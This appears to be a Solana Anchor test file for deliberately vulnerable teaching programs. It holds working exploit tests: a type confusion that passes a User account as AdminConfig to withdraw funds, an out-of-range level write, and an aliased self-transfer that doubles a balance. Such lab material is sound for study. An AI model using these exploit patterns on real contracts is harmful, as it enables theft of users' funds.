import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { assert } from "chai";
import { Keypair, PublicKey, SystemProgram } from "@solana/web3.js";
import { TypeConfusionVulnerable } from "../target/types/type_confusion_vulnerable";
import { RangeCheckVulnerable } from "../target/types/range_check_vulnerable";
import { DuplicateAccountVulnerable } from "../target/types/duplicate_account_vulnerable";

describe("Data Validation Exploits", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  describe("Type Confusion", () => {
    const program = anchor.workspace.TypeConfusionVulnerable as Program<TypeConfusionVulnerable>;
    
    const userAccount = Keypair.generate();
    const attacker = Keypair.generate();
    
    // Attacker ID matches the first byte of attacker's public key (mocking admin ID check)
    const attackerId = new anchor.BN(attacker.publicKey.toBuffer()[0]);

    before(async () => {
      const sig = await provider.connection.requestAirdrop(attacker.publicKey, 10e9);
      await provider.connection.confirmTransaction(sig);
    });

    it("should allow privilege escalation by substituting User account for AdminConfig", async () => {
      // Initialize a standard User account
      await program.methods.initializeUser(attackerId)
        .accounts({
          user: userAccount.publicKey,
          signer: attacker.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([userAccount, attacker])
        .rpc();

      // Attempt admin withdrawal using the User account (type confusion)
      // Expectation: Transaction succeeds despite incorrect account type
      await program.methods.adminWithdraw(new anchor.BN(100))
        .accounts({
          adminConfig: userAccount.publicKey,
          authority: attacker.publicKey,
        })
        .signers([attacker])
        .rpc();
    });
  });

  describe("Range Check", () => {
    const program = anchor.workspace.RangeCheckVulnerable as Program<RangeCheckVulnerable>;
    
    const [character] = PublicKey.findProgramAddressSync(
      [Buffer.from("char"), provider.wallet.publicKey.toBuffer()],
      program.programId
    );
    
    before(async () => {
      await program.methods.initialize()
        .accounts({
          character,
          signer: provider.wallet.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .rpc();
    });

    it("should allow setting invalid levels beyond logical bounds", async () => {
      const invalidLevel = 255;
      
      await program.methods.setLevel(invalidLevel)
        .accounts({
          character,
          signer: provider.wallet.publicKey,
        })
        .rpc();
        
      const account = await program.account.character.fetch(character);
      assert.equal(account.level, 255);
      assert.equal(account.health.toNumber(), 25500);
    });
  });

  describe("Duplicate Account (Aliasing)", () => {
    const program = anchor.workspace.DuplicateAccountVulnerable as Program<DuplicateAccountVulnerable>;
    const wallet = Keypair.generate();
    const initialBalance = 1000;

    before(async () => {
      await program.methods.initialize()
        .accounts({
          wallet: wallet.publicKey,
          signer: provider.wallet.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([wallet])
        .rpc();
    });

    it("should corrupt state when source and destination are aliased", async () => {
      // Perform self-transfer
      await program.methods.transfer(new anchor.BN(1000))
        .accounts({
          from: wallet.publicKey,
          to: wallet.publicKey,
        })
        .rpc();
        
      const account = await program.account.wallet.fetch(wallet.publicKey);
      
      // Balance should incorrectly double due to write-back race condition simulation
      const expectedBalance = initialBalance * 2;
      assert.equal(account.balance.toNumber(), expectedBalance, "Balance did not double as expected in exploitable contract");
    });
  });
});
